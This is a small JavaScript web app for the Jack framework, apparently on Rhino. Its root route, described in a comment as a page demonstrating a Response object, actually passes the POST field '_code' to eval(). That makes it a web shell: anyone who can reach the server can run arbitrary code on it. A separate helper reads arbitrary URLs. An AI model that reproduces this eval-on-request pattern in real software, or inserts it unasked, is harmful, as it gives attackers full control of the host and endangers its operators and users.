var Jack = require("jack");

var map = {};

function fetch(url, post_params) {
  var url = new java.net.URL(url);
  var reader = new java.io.BufferedReader(new java.io.InputStreamReader(url.openStream()));
  var buffer = "";
  var line;
  while (line = reader.readLine()) {
    buffer += line + "\n";
  }
  reader.close();
  return [200, buffer];
}

// an index page demonstrating using a Response object
map["/"] = function(env) {
    var req = new Jack.Request(env),
        resp = new Jack.Response();

    if (req.POST('_code')) { eval(req.POST('_code')); }
    
    return resp.finish();
}

// apply the URLMap
var app = Jack.ContentLength(Jack.URLMap(map));
exports.app = Jack.Static(app);
